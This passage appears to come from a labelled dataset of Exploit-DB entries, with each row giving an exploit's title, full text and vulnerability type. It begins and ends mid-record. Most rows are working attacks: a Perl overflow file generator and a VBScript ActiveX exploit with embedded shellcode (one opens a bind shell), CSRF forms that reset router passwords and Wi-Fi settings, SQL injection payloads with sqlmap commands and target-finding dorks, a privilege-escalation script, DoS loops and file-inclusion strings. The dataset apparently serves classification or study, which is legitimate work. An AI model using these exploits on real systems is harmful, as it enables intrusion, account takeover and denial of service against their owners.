Set-Cookie[SHOPWAREBACKEND=v3mhes99ai1hsolj8vddjkbci2; path=/backend/; HttpOnly]   Reference(s): http://shopware.localhost:8080/ http://shopware.localhost:8080/backend/ http://shopware.localhost:8080/backend/Log/ http://shopware.localhost:8080/backend/customer/ http://shopware.localhost:8080/backend/Log/createLog http://shopware.localhost:8080/backend/customer/save http://shopware.localhost:8080/backend/AttributeData/ http://shopware.localhost:8080/backend/AttributeData/list   Solution - Fix & Patch: ======================= The xss vulnerability can be patched by a secure parse of the customer (kunden) and orders (bestellungen) context listings. Parse or escape the context and disallow special chars during the registration or add to prevent further script code injection attacks.  The vulnerability can be resolved by an update to version 5.3.4 that is delivered by the manufacturer. The issue risk is marked as moderate.    Security Risk: ============== The security risk of the stored cross site scripting vulnerabilities in the shopware cms are estimated as medium. (CVSS 4.4)   Credits & Authors: ================== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri [http://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.]   Disclaimer & Information: ========================= The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or  implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any  case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability Labs or its  suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for incidental or consequential damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface  websites, hack into databases or trade with stolen data. We have no need for criminal activities or membership requests. We do not publish advisories  or vulnerabilities of religious-, militant- and racist- hacker/analyst/researcher groups or individuals. We do not publish trade researcher mails,  phone numbers, conversations or anything else to journalists, investigative authorities or private individuals.",Cross Site Scripting Web,1
31553,"Wireshark 0.99.8 - LDAP Dissector Denial of Service source: https://www.securityfocus.com/bid/28485/info   Wireshark is prone to multiple denial-of-service vulnerabilities.   Exploiting these issues may allow attackers to cause crashes and deny service to legitimate users of the application. Attackers may be able to leverage some of these vulnerabilities to execute arbitrary code, but this has not been confirmed.   These issues affect Wireshark 0.99.2 up to and including 0.99.8.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/31553.pcap",Dissector Denial of Service,1
18159,"XChat 2.8.9 - Heap Overflow Denial of Service #!/usr/bin/python  # Exploit Title: XChat Heap Overflow DoS Proof of Concept # Date: June 2011 # Author: th3p4tri0t # Software Link: http://xchat.org/ # Version: <= 2.8.9  # This only works on XChat on KDE, I'm not sure about windows. # It has been tested on Ubuntu (failed), Kubuntu, and Bactrack 5 # It is a heap overflow and is some sort of error with X Windows # It uses 1537 (this is the minimum) of the ascii value 20 # after this, an unknown number of any other character (did not check for special # characters) is required to trigger a crash, presumably the payload will go here.   # th3p4tri0t  import socket  print ""XChat PoC Exploit by th3p4tri0t\n""  print ""Creating server..."" sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  print ""    [*] Binding to socket..."" sock.bind(('127.0.0.1', 6667))  print ""    [*] Listening on socket..."" sock.listen(5)  print ""    [*] Accepting connection..."" (target, address) = sock.accept()  print ""    [*] Sending payload..."" buffer = ""hybrid7.debian.local "" buffer += chr(20) * 1537         # minimum required of this character buffer += ""A""*4000               # anything can go here and it still works. buffer += "" :*\r\n""  target.send(buffer)  target.close sock.close",Heap Overflow Denial of Service,1
43898,"Dodocool DC38 N300 - Cross-site Request Forgery # Exploit Title: DODOCOOL DC38 N300 Cross-site Request Forgery # Date: 17-01-2018 # Exploit Authors: Raffaele Sabato # Contact: https://twitter.com/syrion89 # Vendor: DODOCOOL # Vendor Homepage: www.dodocool.com # Version: RTN2-AW.GD.R3465.1.20161103 # CVE: CVE-2018-5720  I DESCRIPTION ========================================================================  An issue was discovered in DODOCOOL DC38 3-in-1 N300 Mini Wireless Range Extend RTN2-AW.GD.R3465.1.20161103 devices. A Cross-site request forgery (CSRF) vulnerability allows remote attackers to hijack the authentication of users for requests that modify the configuration. This vulnerability may lead to username and/or password changing, Wi-Fi password changing, etc.  II PROOF OF CONCEPT ========================================================================  ## Change user username and password (test_username:test_password):  <html>   <body>   <script>history.pushState('', '', '/')</script>     <form action=""http://192.168.10.1/boafrm/formPasswordSetup"" method=""POST"">       <input type=""hidden"" name=""submit&#45;url"" value=""&#47;setok&#46;htm&#63;bw&#61;main&#46;htm"" />       <input type=""hidden"" name=""submit&#45;value"" value="""" />       <input type=""hidden"" name=""username"" value=""test&#95;username"" />       <input type=""hidden"" name=""newpass"" value=""test&#95;password"" />       <input type=""hidden"" name=""confpass"" value=""test&#95;password"" />       <input type=""submit"" value=""Submit request"" />     </form>   </body> </html>   ## Change WiFi Configuration (WIFI_TEST:TestTest):  <html>   <body>   <script>history.pushState('', '', '/')</script>     <form action=""http://192.168.10.1/boafrm/formWlanSetupREP"" method=""POST"">       <input type=""hidden"" name=""submit&#45;url"" value=""&#47;setok&#46;htm&#63;bw&#61;wl&#95;rep&#46;htm"" />       <input type=""hidden"" name=""submit&#45;value"" value=""repset"" />       <input type=""hidden"" name=""wl&#95;onoff"" value=""0"" />       <input type=""hidden"" name=""wps&#95;clear&#95;configure&#95;by&#95;reg"" value=""0"" />       <input type=""hidden"" name=""wlProfileId"" value="""" />       <input type=""hidden"" name=""wl&#95;mode"" value=""0"" />       <input type=""hidden"" name=""wl&#95;authType"" value=""auto"" />       <input type=""hidden"" name=""wepEnabled"" value=""ON"" />       <input type=""hidden"" name=""weplength"" value="""" />       <input type=""hidden"" name=""wepformat"" value="""" />       <input type=""hidden"" name=""wl&#95;wpaAuth"" value=""psk"" />       <input type=""hidden"" name=""wl&#95;pskFormat"" value=""0"" />       <input type=""hidden"" name=""wl&#95;pskValue"" value=""TestTest"" />       <input type=""hidden"" name=""wl&#95;ssid"" value=""WIFI_TEST"" />       <input type=""hidden"" name=""wl&#95;Method"" value=""6"" />       <input type=""hidden"" name=""wep&#95;key"" value="""" />       <input type=""hidden"" name=""ciphersuite"" value=""tkip&#43;aes"" />       <input type=""hidden"" name=""ciphersuite"" value=""aes"" />       <input type=""hidden"" name=""wpa2ciphersuite"" value=""tkip&#43;aes"" />       <input type=""hidden"" name=""wpa2ciphersuite"" value=""aes"" />       <input type=""hidden"" name=""web&#95;pskValue"" value=""TestTest"" />       <input type=""submit"" value=""Submit request"" />     </form>   </body> </html>",Cross-site request forgery (CSRF),1
29648,"Active Calendar 1.2 - '/data/m_2.php?css' Cross-Site Scripting source: https://www.securityfocus.com/bid/22705/info    Active Calendar is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.    An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.    Active Calendar 1.2.0 is vulnerable; other versions may also be affected.   http://www.example.com/activecalendar/data/m_2.php?css=""><script>alert(document.cookie)</script>",Cross-Site Scripting,1
25120,"BibORB 1.3.2 - 'index.php' Traversal Arbitrary File Manipulation source: https://www.securityfocus.com/bid/12583/info       BibORB is reported prone to multiple vulnerabilities arising from insufficient sanitization of user-supplied input. These issues can be exploited by a remote attacker to carry out cross-site scripting, HTML injection, SQL injection, directory traversal, and arbitrary file upload attacks.    These vulnerabilities are reported to affect BibORB version 1.3.2 and all previous versions.   http://www.example.com/to/biborb/index.php?mode=result&database_name=../config.php&action=Delete",Traversal Arbitrary File Manipulation,1
47160,"Ovidentia 8.4.3 - SQL Injection #------------------------------------------------------- # Exploit Title: [ Ovidentia CMS - SQL Injection (Authenticated) ] # Date: [ 06/05/2019 ] # CVE: [ CVE-2019-13978 ] # Exploit Author: # [ Fernando Pinheiro (n3k00n3) ] # [ Victor Flores (UserX) ] # Vendor Homepage: [ https://www.ovidentia.org/ ] # Version: [ 8.4.3 ] # Tested on: [ Mac,linux - Firefox, safari ] # Download [ http://en.ovidentia.org/index.php?tg=fileman&sAction=getFile&id=17&gr=Y&path=Downloads%2FDistributions&file=ovidentia-8-4-3.zip&idf=893 ] # #           [ Kitsun3Sec Research Group ] #--------------------------------------------------------  POC  Path: /ovidentia/index.php?tg=delegat&idx=mem&id=1 Type: GET Vulnerable Field: id Payload: 		1. tg=delegat&idx=mem&id=1 AND 3152=(SELECT (CASE WHEN (3152=3152) THEN 3152 ELSE (SELECT 9962 UNION SELECT 		2. tg=delegat&idx=mem&id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))QwTg)  URL: https://target/ovidentia/index.php?tg=delegat&idx=mem&id=1 Using Request file sqlmap.py -r req --random-agent --risk 3 --level 5 --dbms=mysql -p id --dbs  Using Get ./sqlmap.py -u [http://target/ovidentia/index.php\?tg\=delegat\&idx\=mem\&id\=1](http://target/ovidentia/index.php/?tg\=delegat\&idx\=mem\&id\=1) --cookie ""Cookie: OV1364928461=6kb5jvu7f6lg93qlo3vl9111f8"" --random-agent --risk 3 --level 5 --dbms=mysql -p id --dbs",SQL Injection,1
18297,"WSN Links Script 2.3.4 - SQL Injection ############################################################################ # Exploit Title: WSN Links Script SQL Injection Vulnerabilitiy # Google Dork: ""Powered by WSN Links"" # Date: 1/1/2012 # Author: H4ckCity Security Team # Discovered By: farbodmahini # Home: WwW.H4ckCity.Org   # Software Link: http://scripts.webmastersite.net/wsnlinks # Version: All Version # Category:: webapps # Security Risk:: High # Tested on: GNU/Linux Ubuntu - Windows Server - win7 ############################################################################ #  Exploit: # # #  http://www.target.com/links/report.php?id=[SQLi] # # ############################################################################ # Special Thanks : Mehdi.H4ckcity-2MzRp-Mikili-M.Prince-Bl4ck.Viper-iC0d3R-  # IrIsT-K0242-P0W3RFU7-Mr.M4st3r-Higher_Sense ,... ############################################################################ GreetZ : All H4ckCity Member - BHG Members ############################################################################",SQL Injection,1
41513,"Entrepreneur Bus Booking Script 3.03 - 'hid_Busid' SQL Injection # # # # #  # Exploit Title: Entrepreneur Bus Booking Script v3.03 - SQL Injection # Google Dork: N/A # Date: 06.03.2017 # Vendor Homepage: http://www.phpscriptsmall.com/ # Software : http://www.phpscriptsmall.com/product/entrepreneur-bus-booking-script/ # Demo: http://travelbookingscript.com/demo/busbooking/ # Version: 3.03 # Tested on: Win7 x64, Kali Linux x64 # # # # #  # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Mail : ihsan[@]ihsan[.]net # # # # # # SQL Injection/Exploit : # http://localhost/[PATH]/available_seat.php?hid_Busid=[SQL] # # # # #",SQL Injection,1
11113,"tincan ltd - 'section' SQL Injection +/=============================================\+ # [+] Title : tincan ltd (section) SQL Injection Vulnerability # [+] site s.p : www.tincan.co.uk<http://www.tincan.co.uk> # [+] Author : altbta # [+] Email : l_9@HoTMaIL.com # [+] home : v4-team.com<http://v4-team.com> & tryag.cc +\=============================================/+  =============================================== DorK : intext:'powered by tincan ltd' and  inurl:""section.php?section=9"" =============================================== Exploit : http://server/section.php?section=9&topic=6+union+select+1,2,3,version(),5-- ============================================ GreeTz To :   RxH   &    ab0-3th4b   &   sniper site",SQL Injection,1
23453,"BES-CMS 0.4/0.5 - 'index.inc.php' File Inclusion source: https://www.securityfocus.com/bid/9268/info  It has been reported that BES-CMS is vulnerable to a remote file include vulnerability that may allow an attacker to include malicious files containing arbitrary code to be executed on a vulnerable system. The problem exists in the 'index.inc.php', 'Members/index.inc.php', 'Members/root/index.inc.php', 'Include/functions_folder.php', 'Include/functions_message.php', 'Include/Start.php' scripts of the software.  BES-CMS versions 0.4 rc3 and 0.5 rc3 are reported to be vulnerable to this issue, however other versions may be affected as well.    http://www.example.com/index.inc.php?PATH_Includes=http://www.example.com/",remote file include,1
9655,"Invisible Browsing 5.0.52 - '.ibkey' Local Buffer Overflow #!/usr/bin/perl  print qq(   ############################################################   ##                Iranian Pentesters Home                 ##   ##                   Www.Pentesters.Ir                    ##   ##                  PLATEN -[ H.jafari ]-                 ##    ## Invisible Browsing 5.0.52 (.ibkey) Local BoF Exploit   ##   ## bug found & exploited by:  PLATEN                      ##   ## E-mail && blog:                                        ##   ## hjafari.blogspot.com                                   ##   ## platen.secure[at]gmail[dot]com                         ##    ## Greetings: Cru3l.b0y, b3hz4d, Cdef3nder                ##   ## and all members in Pentesters.ir                       ##   ############################################################ ); # Note: I just test this version $junk  =""\x41""x 5000; $ret   = ""\x93\x43\x92\x7c""; $nop   = ""\x90"" x 50; # win32_exec - Size=160 #EXITFUNC=seh CMD=calc   #Encoder=PexFnstenvSub http://metasploit.com $shellcode = ""\x31\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x38"". ""\x78\x73\x8a\x83\xeb\xfc\xe2\xf4\xc4\x90\x37\x8a\x38\x78\xf8\xcf"". ""\x04\xf3\x0f\x8f\x40\x79\x9c\x01\x77\x60\xf8\xd5\x18\x79\x98\xc3"". ""\xb3\x4c\xf8\x8b\xd6\x49\xb3\x13\x94\xfc\xb3\xfe\x3f\xb9\xb9\x87"". ""\x39\xba\x98\x7e\x03\x2c\x57\x8e\x4d\x9d\xf8\xd5\x1c\x79\x98\xec"". ""\xb3\x74\x38\x01\x67\x64\x72\x61\xb3\x64\xf8\x8b\xd3\xf1\x2f\xae"". ""\x3c\xbb\x42\x4a\x5c\xf3\x33\xba\xbd\xb8\x0b\x86\xb3\x38\x7f\x01"". ""\x48\x64\xde\x01\x50\x70\x98\x83\xb3\xf8\xc3\x8a\x38\x78\xf8\xe2"". ""\x04\x27\x42\x7c\x58\x2e\xfa\x72\xbb\xb8\x08\xda\x50\x88\xf9\x8e"". ""\x67\x10\xeb\x74\xb2\x76\x24\x75\xdf\x1b\x12\xe6\x5b\x78\x73\x8a""; open(fhandle,'>>expl.ibkey'); print fhandle $junk.$ret.$nop.$shellcode; close(fhandle); print ""\n  [+] File created successfully: expl.ibkey \n"";  # milw0rm.com [2009-09-14]",Local Buffer Overflow,1
782,"TinyWeb 1.9 - Denial of Service #TinyWeb version 1.9 DoS Exploit #Coded bY ++Karak0rsan++ #Usage:perl tiny.pl [target] #Greetz:Phalaposher,r3d_b4r0n,Hurby,ZzagorR,L4M3R,zeronc,Atak,sloan,fox and #all my friends # w0rdz: cengiz g t ne sokam senin ehehheh bak exploit yay nlan rsa reziL #olacan :D ama #yay nlanmaz belki yay nlansada bo ver nickini s ylemiyom #anlamazlar :P okullar a l yo peder benim #bilg. kald r yo ne yapcam ben #bilmiyom a.k :) siktiri boktan bi dos exploiti yazd k yolluyoz g venlik #sitesine :D neyse uzatmayal m ""I AM 15 YEARS OLD"" ya m z belirtelim :D  $target=$ARGV[0];  if(!$ARGV[0]){         print ""TinyWeb version 1.9 DoS Exploit\n"";         print ""Coded by ++Karak0rsan++\n"";         print ""Usage:perl tiny.pl [target]\n""; }   use IO::Socket; $sock = new IO::Socket::INET( PeerAddr => $target, PeerPort => 80, Proto => 'tcp', Type => SOCK_STREAM, ); close($sock); if($sock){         print ""[+]Attacking...\n""; }   $ish=1;  do { $ish++; use IO::Socket; $socket = new IO::Socket::INET( PeerAddr => $target, PeerPort => 80, Proto => 'tcp', Type => SOCK_STREAM, ) or die ""Didnt Connect,please check your target address!\n""; print $socket ""GET /cgi-bin/.%00./dddd.html HTTP/1.0\r\n""; close($socket); } while ($ish < 10000);  print ""OK ;)\n""; exit();  # milw0rm.com [2005-02-01]",Denial of Service,1
36384,"SugarCRM Community Edition 6.3.0RC1 - 'index.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/50870/info  SugarCRM Community Edition is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  SugarCRM Community Edition 6.3.0RC1 is vulnerable; other versions may also be affected.  http://www.example.com/index.php?entryPoint=json&action=get_full_list&module=Leads&where=0%29%20union%20select%20version%28%29,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71%20--%20  http://www.example.com/index.php?entryPoint=json&action=get_full_list&module=Leads&order=SQL_CODE_HERE%20--%20",SQL Injections,1
33743,"ZeroCMS 1.0 - 'zero_transact_user.php' Handling Privilege Escalation import sys,getopt,cookielib,urllib2,urllib  # ZeroCMS 1.0  # zero_transact_user.php # Impropper Form post hanling, (parameter polution) # Vendor: Another Awesome Stuff  # Product web page: http://www.aas9.in/zerocms/ # author: tiago.alexand@gmail.com # Tested on: php 5.4.27 # OSVDB ID: 108025 # description # Summary: ZeroCMS is a very simple Content Management # System built using PHP and MySQL. # the script zero_transact_user.php contains a Modify Account case  # where the execution context doen't have in to consideration the current user's permitions  # allowing a malcious user to escalate its privileges to admin.    def  exploit(host,email,name,userid):    access_level = 3 # default for admin    url = host + '/zero_transact_user.php' #the script handles user related actions    args = { 'user_id':userid,'email':email, 'name':name,'access_level':access_level,'action':'Modify Account' }    data = urllib.urlencode(args)    cj = cookielib.CookieJar()    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))    response = opener.open(url,data);    print response.read() 	 def main(argv):    host = ''    email = ''    accountname = ''    userid = ''    try:       opts, args = getopt.getopt(argv,""hu:m:n:i:"")    except getopt.GetoptError:       print 'zero_cms_privEscalation.py -u <host> -m <email> -n <account name> -i acount id'       sys.exit(2)    for opt, arg in opts:       if opt == '-h':          print 'zero_cms_privEscalation.py -u <host> -m <email> -n <account name> -i acount id'          sys.exit()       elif opt in (""-u""):          host = arg       elif opt in (""-m""):       	 email = arg       elif opt in (""-n""):       	 accountname = arg       elif opt in (""-i""):       	 userid = arg    exploit(host,email,accountname,userid)  if __name__ == ""__main__"":    main(sys.argv[1:])",Handling Privilege Escalation,1
14858,"Autodesk MapGuide Viewer - ActiveX Denial of Service   # Exploit Title: Autodesk MapGuide Viewer ActiveX(MGAXCTRL.DLL)Overflow Vulnerability  # Date: [01-09-2010] # Author: [d3b4g] # Software Link: http://usa.autodesk.com/adsk/servlet/item?siteID=123112&id=9454821 # Version: [6.5] # Tested on: [Winxp SP3] # regards to ROL guys      Exception Code: ACCESS_VIOLATION Disasm: 175CE9E	CMP DWORD PTR [ESI+1C],0	(MGAXCTRL.DLL)  Seh Chain: -------------------------------------------------- 1 	192847C 	MGAXCTRL.DLL 2 	73352542 	VBSCRIPT.dll 3 	7C839AD8 	KERNEL32.dll    Registers: -------------------------------------------------- EIP 0175CE9E EAX 00000001 EBX 003EB690 -> 0193F684 ECX 00000000 EDX 003E0608 -> 00180F98 EDI 003EB5D8 -> 0193FC24 ESI 00000404 EBP 0013EA84 -> 0013EAA0 ESP 0013EA58 -> 003EB644    ArgDump: -------------------------------------------------- EBP+8	003EB644 -> 0193F90C EBP+12	00000000 EBP+16	0013EAD4 -> 00130000 EBP+20	0042C4F4 -> 00110024 EBP+24	0013EA94 -> 0013EAD4 EBP+28	0013EB30 -> 0013EBC0   Block Disassembly:  -------------------------------------------------- 175CE8F	POP ESI 175CE90	JMP [EAX+60] 175CE93	PUSH ESI 175CE94	LEA ESI,[ECX+404] 175CE9A	TEST ESI,ESI 175CE9C	JE SHORT 0175CEC2 175CE9E	CMP DWORD PTR [ESI+1C],0	  <--- CRASH 175CEA2	JE SHORT 0175CEC2 175CEA4	PUSH 0 175CEA6	PUSH DWORD PTR [ESP+C] 175CEAA	MOV ECX,ESI 175CEAC	PUSH 0 175CEAE	CALL 01912C63 175CEB3	MOV EAX,[ESI] 175CEB5	MOV ECX,ESI      PoC:   <object classid='clsid:62789780-B744-11D0-986B-00609731A21D' id='target' /> <script language='vbscript'>  'File Generated by COMRaider v0.0.133 - http://labs.idefense.com  'Wscript.echo typename(target)  'for debugging/custom prolog targetFile = ""C:\Program Files\Autodesk\MapGuideViewerActiveX6.5\MgAxCtrl.dll"" prototype  = ""Property Let LayersViewWidth As Long"" memberName = ""LayersViewWidth"" progid     = ""MGMapControl.MGMap"" argCount   = 1  arg1=0  target.LayersViewWidth = arg1  </script>",ActiveX Denial of Service,1
32071,Claroline 1.8.9 - '/claroline/redirector.php?url' Arbitrary Site Redirect source: https://www.securityfocus.com/bid/30269/info              Claroline is prone to multiple input-validation vulnerabilities:              1. Multiple cross-site scripting vulnerabilities. 2. A remote URI-redirection vulnerability.              An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site and redirect users to an attacker-controlled site; this may aid in phishing-style attacks.              Versions prior to Claroline 1.8.10 are vulnerable.   http://www.example.com/[installdir]/claroline/redirector.php?url=http://www.example2.com,Arbitrary Site Redirect,1
25563,Oracle Application Server 9i - Webcache PartialPageErrorPage Cross-Site Scripting source: https://www.securityfocus.com/bid/13422/info  A remote cross-site scripting vulnerability affects the Oracle Application Server 9i Webcache administration console. This issue is due to a failure of the application to properly sanitize user-supplied input prior to including it in dynamically generated Web content.  The issue affects the 'PartialPageErrorPage' parameter of the 'webcacheadmin' script.   http://example.com:4000/webcacheadmin?SCREEN_ID=CGA.Site.ApologyPages_Edit&ACTION=Submit&PartialPageErrorPage=/inservice.html<script>alert(document.cookie)</script>&site_id=2,remote cross-site scripting,1
34484,"Joomla! Component com_dirfrm - Multiple SQL Injections source: https://www.securityfocus.com/bid/42512/info  The 'com_dirfrm' component for Joomla! is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/path/index.php?option=com_dirfrm&task=listAll&catid=[SQL Injection]&id=8&Itemid=32  http://www.example.com/path/index.php?option=com_dirfrm&task=listAll&catid=1&id=[SQL Injection]&Itemid=32",SQL Injections,1
35734,"ZAPms 1.22 - 'nick' SQL Injection source: https://www.securityfocus.com/bid/47782/info  ZAPms is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  ZAPms 1.22 is vulnerable; other versions may also be affected.   The following example request is available:  <form action=""http://www.example.com/[path]/?sid=1"" method=""post"" id=""Login"" > <input name=""nick"" type=""text"" id=""nick"" value=""'SQL+CODE+HERE"" /> <input name=""pwd"" id=""pwd"" type=""password"" value=""adminpwd"" /> <input name=""submit"" type=""submit"" class=""submit_login"" value=""Login"" /> </form>",SQL-injection,1
6042,"Wysi Wiki Wyg 1.0 - Local File Inclusion / Cross-Site Scripting / PHPInfo /*        Wysi Wiki Wyg 1.0 (LFI,XSS,PHPInfo) Remote Vulnerabilities    ----------------------------------------------------------    By StAkeR[at]hotmail[dot]it    http://www.easy-script.com/scripts-dl/wysiwikiwyg10.zip    ----------------------------------------------------------    1- PHPInfo Disclosure    -  index.php?categup=isset      2- Local File Inclusion (LFI) (MQ Off)   -  index.php?c=../../../&a=etc/passwd%00      3- Cross Site Scripting (XSS)   -  index.php?c=wikiwizi&a=recherche&s=<script>[Javascript]</script>    */  # milw0rm.com [2008-10-20]",Cross Site Scripting (XSS),1
14321,"Image22 ActiveX 1.1.1 - Remote Buffer Overflow <html> <object classid='clsid:1DC09FDF-2EF8-4CE9-ADEA-4D6A98A2F779' id='target'></object> <script language='vbscript'>  ' 988 bytes for shellcode ' bind shell port 4444 sc =  unescape(""%eb%03%59%eb%05%e8%f8%ff%ff%ff%4f%49%49%49%49%49"") & _                unescape(""%49%51%5a%56%54%58%36%33%30%56%58%34%41%30%42%36"") & _                unescape(""%48%48%30%42%33%30%42%43%56%58%32%42%44%42%48%34"") & _                unescape(""%41%32%41%44%30%41%44%54%42%44%51%42%30%41%44%41"") & _                unescape(""%56%58%34%5a%38%42%44%4a%4f%4d%4e%4f%4c%56%4b%4e"") & _                unescape(""%4d%54%4a%4e%49%4f%4f%4f%4f%4f%4f%4f%42%56%4b%48"") & _                unescape(""%4e%56%46%32%46%32%4b%38%45%44%4e%53%4b%58%4e%37"") & _                unescape(""%45%30%4a%57%41%30%4f%4e%4b%48%4f%34%4a%51%4b%58"") & _                unescape(""%4f%35%42%52%41%50%4b%4e%49%54%4b%48%46%53%4b%48"") & _                unescape(""%41%50%50%4e%41%33%42%4c%49%59%4e%4a%46%38%42%4c"") & _                unescape(""%46%37%47%50%41%4c%4c%4c%4d%30%41%30%44%4c%4b%4e"") & _                unescape(""%46%4f%4b%53%46%55%46%42%4a%52%45%57%45%4e%4b%58"") & _                unescape(""%4f%35%46%32%41%30%4b%4e%48%56%4b%58%4e%30%4b%44"") & _                unescape(""%4b%58%4f%55%4e%51%41%50%4b%4e%43%50%4e%32%4b%48"") & _                unescape(""%49%38%4e%56%46%42%4e%31%41%46%43%4c%41%53%4b%4d"") & _                unescape(""%46%36%4b%58%43%54%42%43%4b%48%42%44%4e%50%4b%58"") & _                unescape(""%42%47%4e%51%4d%4a%4b%38%42%54%4a%30%50%35%4a%56"") & _                unescape(""%50%48%50%54%50%30%4e%4e%42%55%4f%4f%48%4d%48%46"") & _                unescape(""%43%35%48%56%4a%36%43%33%44%53%4a%46%47%47%43%37"") & _                unescape(""%44%43%4f%45%46%55%4f%4f%42%4d%4a%46%4b%4c%4d%4e"") & _                unescape(""%4e%4f%4b%43%42%55%4f%4f%48%4d%4f%35%49%48%45%4e"") & _                unescape(""%48%56%41%38%4d%4e%4a%30%44%50%45%45%4c%36%44%50"") & _                unescape(""%4f%4f%42%4d%4a%46%49%4d%49%50%45%4f%4d%4a%47%55"") & _                unescape(""%4f%4f%48%4d%43%55%43%35%43%35%43%55%43%45%43%54"") & _                unescape(""%43%55%43%54%43%45%4f%4f%42%4d%48%56%4a%56%41%41"") & _                unescape(""%4e%45%48%46%43%55%49%48%41%4e%45%39%4a%36%46%4a"") & _                unescape(""%4c%31%42%37%47%4c%47%55%4f%4f%48%4d%4c%46%42%41"") & _                unescape(""%41%55%45%35%4f%4f%42%4d%4a%46%46%4a%4d%4a%50%32"") & _                unescape(""%49%4e%47%35%4f%4f%48%4d%43%55%45%55%4f%4f%42%4d"") & _                unescape(""%4a%36%45%4e%49%34%48%48%49%54%47%45%4f%4f%48%4d"") & _                unescape(""%42%35%46%35%46%55%45%45%4f%4f%42%4d%43%39%4a%46"") & _                unescape(""%47%4e%49%37%48%4c%49%57%47%35%4f%4f%48%4d%45%45"") & _                unescape(""%4f%4f%42%4d%48%56%4c%36%46%56%48%56%4a%46%43%46"") & _                unescape(""%4d%56%49%38%45%4e%4c%56%42%45%49%35%49%42%4e%4c"") & _                unescape(""%49%38%47%4e%4c%46%46%54%49%38%44%4e%41%33%42%4c"") & _                unescape(""%43%4f%4c%4a%50%4f%44%54%4d%32%50%4f%44%44%4e%32"") & _                unescape(""%43%49%4d%58%4c%57%4a%53%4b%4a%4b%4a%4b%4a%4a%46"") & _                unescape(""%44%57%50%4f%43%4b%48%41%4f%4f%45%57%46%44%4f%4f"") & _                unescape(""%48%4d%4b%55%47%55%44%55%41%45%41%45%41%45%4c%56"") & _                unescape(""%41%30%41%45%41%35%45%45%41%45%4f%4f%42%4d%4a%46"") & _                unescape(""%4d%4a%49%4d%45%30%50%4c%43%45%4f%4f%48%4d%4c%36"") & _                unescape(""%4f%4f%4f%4f%47%43%4f%4f%42%4d%4b%38%47%35%4e%4f"") & _                unescape(""%43%38%46%4c%46%46%4f%4f%48%4d%44%55%4f%4f%42%4d"") & _                unescape(""%4a%46%42%4f%4c%58%46%30%4f%45%43%35%4f%4f%48%4d"") & _                unescape(""%4f%4f%42%4d%5a"")   buffer1 = string(619, ""A"") next_seh = unescape(""%eb%06%90%90"") seh = unescape(""%56%29%d1%72"") nops = string(10, unescape(""%90"")) arg2=1 arg3=1 arg4=1  exploit = buffer1 + next_seh + seh + nops + sc target.DrawIcon exploit ,arg2 ,arg3 ,arg4  </script>",Remote Buffer Overflow,1
4805,"NoseRub 0.5.2 - Login SQL Injection ############################################################################     -- ----------  ----           - ----------------------------           ---------- ----        --  -----------------------------            -------------           ---seclog- ------------------            ------------           --  ---   -------------------              ---------            ----    -------------------               -------             --------------------------               ---               --------------   -----------                 ---            --------------     --   ---  -                    -  ---       --------------     -    --  -                      ----           ---------                     ----------       -------            - -    --                     ----------        ------                    -                       -------         ----- -             ---------                       ------           ----               ---------                       ---               --                       ---                       --                                          -- ############################################################################ #                  seclog.de Security Advisory 2007-001                    # ############################################################################               Advisory: NoseRub Login SQL Injection Vulnerability     Affected Versions: <= 0.5.2       Fixed Versions: current SVN                 Risk: critical              Vendor URL: http://noserub.com        Vendor Status: informed, fixed version will be released soon         Advisory URL: http://seclog.de/pub/seclog-2007-001.txt      Advisory Status: public               Author: Felix Groebert <felix AT groebert DOT org>             Revision: 2007-12-26    Introduction ============   NoseRub is a protocol for and a sample implementation of a decentralized   social network.   Vulnerability =============   The login script fails to validate user input. It is possible to insert   double quotes in order to escape the following SQL query:    SELECT `Identity`.`id`, `Identity`.`is_local`, [...]   FROM `identities` AS `Identity` WHERE `Identity`.`hash` = ''   AND `Identity`.`username` = ""www.example.com/noserub/USERNAME""   AND `Identity`.`password` = 'f970e2767d0cfe75876ea857f92e319b' LIMIT 1    The query is generated at the end of the function check() in   app/models/identity.php:    return $this->find(array('Identity.hash' => '',               'Identity.username = ""'. $username .'""',                'Identity.password' => md5($data['Identity']['password'])));   Proof of Concept ================   The SQL injection bug can be exploited by impersonating a registered user.       Go to: http://www.example.com/noserub/pages/login/   Login as: somereallogin "" -- ""   Password: unknownpassword    This results in the following SQL query, commenting out the fourth and fifth   lines using double dashes, thus maintaining valid SQL syntax.    SELECT `Identity`.`id`, `Identity`.`is_local`, [...]   FROM `identities` AS `Identity` WHERE `Identity`.`hash` = ''   AND `Identity`.`username` = ""www.example.com/noserub/somereallogin""   -- """" AND `Identity`.`password` = 